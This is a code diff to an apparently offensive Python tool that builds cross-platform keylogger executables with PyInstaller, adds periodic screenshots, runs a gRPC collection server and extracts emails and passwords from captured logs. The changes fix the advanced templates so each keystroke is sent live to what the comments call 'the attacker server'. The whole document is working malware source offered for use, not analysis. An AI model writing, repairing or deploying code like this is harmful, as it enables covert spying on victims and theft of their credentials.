@@ -1,5 +1,3 @@
-
-
 import sys
 import os
 
@@ -14,14 +12,14 @@ except Exception:
 from libs import *
 
 class KlgMalware:
-    def __init__(self, output_dir,script ,filename, extention, configs, pltfrm):
+    def __init__(self, output_dir, script, filename, extention, configs, pltfrm):
         self.pltfrm = pltfrm
         self.output_dir = output_dir
         self.script = script
         self.filename = filename
         self.extention = extention
-
         self.configs = configs
+
     def build_standard(self):
         if pyinstaller is None:
             print("[!] PyInstaller is not installed. Please install it to build the executable.")
@@ -29,7 +27,6 @@ class KlgMalware:
 
         output_path = f"{self.output_dir}/{self.filename}.{self.extention}"
 
-        # Write the script to a temporary file
         import tempfile
         import os
         
@@ -52,13 +49,11 @@ class KlgMalware:
         try:
             pyinstaller.run(pyinstaller_args)
             print(f"[+] Executable built successfully at: {output_path}")
-            # Clean up temp file
             if os.path.exists(temp_script_path):
                 os.remove(temp_script_path)
             return True
         except Exception as e:
             print(f"[!] Build failed: {e}")
-            # Clean up temp file on failure too
             if os.path.exists(temp_script_path):
                 os.remove(temp_script_path)
             return False
@@ -71,7 +66,6 @@ class KlgMalware:
 
         output_path = f"{self.output_dir}/{self.filename}.{self.extention}"
 
-        # Write the script to a temporary file
         import tempfile
         import os
         
@@ -96,16 +90,15 @@ class KlgMalware:
         try:
             pyinstaller.run(pyinstaller_args)
             print(f"[+] Advanced executable built successfully at: {output_path}")
-            # Clean up temp file
             if os.path.exists(temp_script_path):
                 os.remove(temp_script_path)
             return True
         except Exception as e:
             print(f"[!] Build failed: {e}")
-            # Clean up temp file on failure too
             if os.path.exists(temp_script_path):
                 os.remove(temp_script_path)
             return False
+
 
 # define functions depending on OS
 def get_platform():
@@ -121,7 +114,7 @@ def get_platform():
         return 'unknown'
     
 platform = get_platform()
-#get if current script usecase 
+
 def getCurrentUsecase():
     args = sys.argv
     if '--start' in args:
@@ -138,13 +131,13 @@ def getCurrentUsecase():
         return '5'
     else:
         return 'help'
-usecase=getCurrentUsecase()
+
+usecase = getCurrentUsecase()
 
 # ============================================
 # ARGUMENT PARSING HELPERS
 # ============================================
 def parse_arg(prefix):
-    """Parse argument with format prefix:value from sys.argv"""
     for arg in sys.argv:
         if arg.startswith(prefix + ':'):
             return arg.split(':', 1)[1]
@@ -196,6 +189,9 @@ if __name__ == "__main__":
     main()
 '''
 
+# FIX: use cln.configure() so the right server is targeted,
+#      pass grpc_sender= into loggerFunction so on_press actually sends,
+#      and add .png extension to screenshot filenames.
 SCRIPT_WIN_ADVANCED_TEMPLATE = '''
 import sys
 import os
@@ -203,35 +199,34 @@ import threading
 import time
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from libs.winlog import loggerFunction as loggerFunctionWindows
-from libs.cln import send_key_non_blocking as send_key
+from libs import cln
 from libs.capture import take_screenshot
 
 # Configuration
 GRPC_HOST = "{host}"
-GRPC_PORT = "{port}"
+GRPC_PORT = {port}
 SCREENSHOT_INTERVAL = {screenshot_interval}
 
-def my_action(key_str, key_type, window, timestamp):
-    """Send keystroke to gRPC server"""
-    message = f"[WIN] {{key_str}} | {{key_type}} | {{window}} | {{timestamp}}"
-    send_key(message)
+# Point the gRPC client at the attacker server
+cln.configure(GRPC_HOST, GRPC_PORT)
 
 def screenshot_loop():
-    """Take screenshots at regular intervals"""
+    """Take screenshots at regular intervals."""
     while True:
         try:
-            take_screenshot(platform='win', folder='./screenshots', filename=f'screenshot_{{int(time.time())}}')
-        except Exception as e:
+            fname = f"sc_{{int(time.time())}}.png"
+            take_screenshot(platform='win', folder='./screenshots', filename=fname)
+        except Exception:
             pass
         time.sleep(SCREENSHOT_INTERVAL)
 
 def main():
-    # Start screenshot thread
     screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
     screenshot_thread.start()
-    
-    # Start keylogger with action callback
-    loggerFunctionWindows(action=my_action)
+
+    # Pass cln.send_key_non_blocking as grpc_sender so every key press
+    # is forwarded to the attacker server directly from on_press().
+    loggerFunctionWindows(grpc_sender=cln.send_key_non_blocking)
 
 if __name__ == "__main__":
     main()
@@ -259,35 +254,32 @@ import threading
 import time
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from libs.linlog import loggerFunction as loggerFunctionLinux
-from libs.cln import send_key_non_blocking as send_key
+from libs import cln
 from libs.capture import take_screenshot
 
 # Configuration
 GRPC_HOST = "{host}"
-GRPC_PORT = "{port}"
+GRPC_PORT = {port}
 SCREENSHOT_INTERVAL = {screenshot_interval}
 
-def my_action(key_str, key_type, window, timestamp):
-    """Send keystroke to gRPC server"""
-    message = f"[LNX] {{key_str}} | {{key_type}} | {{window}} | {{timestamp}}"
-    send_key(message)
+# Point the gRPC client at the attacker server
+cln.configure(GRPC_HOST, GRPC_PORT)
 
 def screenshot_loop():
-    """Take screenshots at regular intervals"""
+    """Take screenshots at regular intervals."""
     while True:
         try:
-            take_screenshot(platform='lnx', folder='./screenshots', filename=f'screenshot_{{int(time.time())}}')
-        except Exception as e:
+            fname = f"sc_{{int(time.time())}}.png"
+            take_screenshot(platform='lnx', folder='./screenshots', filename=fname)
+        except Exception:
             pass
         time.sleep(SCREENSHOT_INTERVAL)
 
 def main():
-    # Start screenshot thread
     screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
     screenshot_thread.start()
-    
-    # Start keylogger with action callback
-    loggerFunctionLinux(action=my_action)
+
+    loggerFunctionLinux(grpc_sender=cln.send_key_non_blocking)
 
 if __name__ == "__main__":
     main()
@@ -315,35 +307,32 @@ import threading
 import time
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from libs.maclog import loggerFunction as loggerFunctionMac
-from libs.cln import send_key_non_blocking as send_key
+from libs import cln
 from libs.capture import take_screenshot
 
 # Configuration
 GRPC_HOST = "{host}"
-GRPC_PORT = "{port}"
+GRPC_PORT = {port}
 SCREENSHOT_INTERVAL = {screenshot_interval}
 
-def my_action(key_str, key_type, window, timestamp):
-    """Send keystroke to gRPC server"""
-    message = f"[MAC] {{key_str}} | {{key_type}} | {{window}} | {{timestamp}}"
-    send_key(message)
+# Point the gRPC client at the attacker server
+cln.configure(GRPC_HOST, GRPC_PORT)
 
 def screenshot_loop():
-    """Take screenshots at regular intervals"""
+    """Take screenshots at regular intervals."""
     while True:
         try:
-            take_screenshot(platform='mac', folder='./screenshots', filename=f'screenshot_{{int(time.time())}}')
-        except Exception as e:
+            fname = f"sc_{{int(time.time())}}.png"
+            take_screenshot(platform='mac', folder='./screenshots', filename=fname)
+        except Exception:
             pass
         time.sleep(SCREENSHOT_INTERVAL)
 
 def main():
-    # Start screenshot thread
     screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
     screenshot_thread.start()
-    
-    # Start keylogger with action callback
-    loggerFunctionMac(action=my_action)
+
+    loggerFunctionMac(grpc_sender=cln.send_key_non_blocking)
 
 if __name__ == "__main__":
     main()
@@ -420,7 +409,6 @@ def run_serve():
     server.serve(host=host, port=int(port))
 
 def run_build_standard():
-    """Build standard executable"""
     target = get_target_platform()
     output_dir = get_output_dir()
     filename = get_filename()
@@ -429,7 +417,6 @@ def run_build_standard():
     print(f"[*] Building standard executable for platform: {target}")
     print(f"    Output: {output_dir}/{filename}.{ext}")
     
-    # Select script based on target platform
     if target == 'win':
         script = SCRIPT_WIN_STANDARD
     elif target == 'lnx':
@@ -451,7 +438,6 @@ def run_build_standard():
     malware.build_standard()
 
 def run_build_advanced():
-    """Build advanced executable with gRPC and screenshots"""
     target = get_target_platform()
     output_dir = get_output_dir()
     filename = get_filename()
@@ -465,7 +451,6 @@ def run_build_advanced():
     print(f"    gRPC Server: {host}:{port}")
     print(f"    Screenshot interval: {screenshot_interval}s")
     
-    # Select and format script based on target platform
     if target == 'win':
         script = SCRIPT_WIN_ADVANCED_TEMPLATE.format(
             host=host, port=port, screenshot_interval=screenshot_interval
@@ -493,15 +478,12 @@ def run_build_advanced():
     malware.build_advanced()
 
 def run_classify():
-    """Classify log file to extract emails and passwords"""
     input_file = get_input_file()
     print(f"[*] Classifying log file: {input_file}")
     
     import re
     
-    # Email regex
     email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
-    # Password patterns (common formats)
     password_patterns = [
         r'(?:password|passwd|pwd|pass)[:\s=]+([^\s\n]+)',
         r'(?:mot de passe|mdp)[:\s=]+([^\s\n]+)',
@@ -511,10 +493,8 @@ def run_classify():
         with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
         
-        # Find emails
         emails = set(re.findall(email_pattern, content, re.IGNORECASE))
         
-        # Find passwords
         passwords = set()
         for pattern in password_patterns:
             matches = re.findall(pattern, content, re.IGNORECASE)
@@ -534,7 +514,6 @@ def run_classify():
         print(f"[!] Error reading file: {e}")
 
 def run_screenshot():
-    """Take a screenshot"""
     target = get_target_platform()
     output_dir = get_output_dir()
     filename = get_filename()
